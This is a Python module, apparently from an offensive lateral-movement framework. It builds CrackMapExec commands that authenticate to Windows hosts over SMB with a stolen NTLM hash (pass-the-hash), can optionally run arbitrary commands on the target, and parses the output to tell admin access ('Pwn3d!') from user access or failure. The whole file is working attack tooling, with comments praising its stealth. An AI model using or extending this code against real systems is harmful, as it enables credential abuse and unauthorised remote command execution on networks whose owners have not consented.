"""
SMB Pass-the-Hash using CrackMapExec
Most versatile and stealthy lateral movement method
"""

import sys
from pathlib import Path
from typing import Optional, Tuple

# Add parent to path for imports
sys.path.insert(0, str(Path(__file__).parent.parent))

from base import BaseAuthMethod
from ..core.models import AuthMethod, AccessLevel, Credential


class SMBAuthMethod(BaseAuthMethod):
    """
    Pass-the-Hash via SMB using CrackMapExec

    CrackMapExec (CME) is the go-to tool for lateral movement.
    It's fast, stealthy, and provides excellent feedback.

    Indicators:
        - 'Pwn3d!' = Admin access
        - Standard connection = User access
        - 'STATUS_LOGON_FAILURE' = Auth failed
    """

    method = AuthMethod.SMB_CME

    def build_command(self, target: str, credential: Credential,
                      command: Optional[str] = None) -> str:
        """
        Build CrackMapExec SMB command

        Args:
            target: Target IP or hostname
            credential: Credential with username, hash, domain
            command: Optional command to execute via -x flag

        Returns:
            CrackMapExec command string
        """
        cmd = (
            f"crackmapexec smb {target} "
            f"-u '{credential.username}' "
            f"-H '{credential.ntlm_hash}' "
            f"-d '{credential.domain}'"
        )

        if command:
            cmd += f" -x '{command}'"

        return cmd

    def parse_output(self, output_text: str) -> Tuple[bool, AccessLevel, Optional[str]]:
        """
        Parse CrackMapExec output

        Args:
            output_text: CME command output

        Returns:
            Tuple of (success, access_level, error_message)
        """
        output_lower = output_text.lower()

        # Check for admin access (the holy grail)
        if 'pwn3d!' in output_lower:
            return True, AccessLevel.ADMIN, None

        # Check for authentication failures
        failure_indicators = [
            'status_logon_failure',
            'authentication failed',
            'access denied',
            'status_account_disabled',
            'status_account_locked_out'
        ]

        for indicator in failure_indicators:
            if indicator in output_lower:
                return False, AccessLevel.NONE, f"Auth failed: {indicator}"

        # If we got here without errors, we have user-level access
        if output_text.strip():
            return True, AccessLevel.USER, None

        return False, AccessLevel.NONE, "No response from target"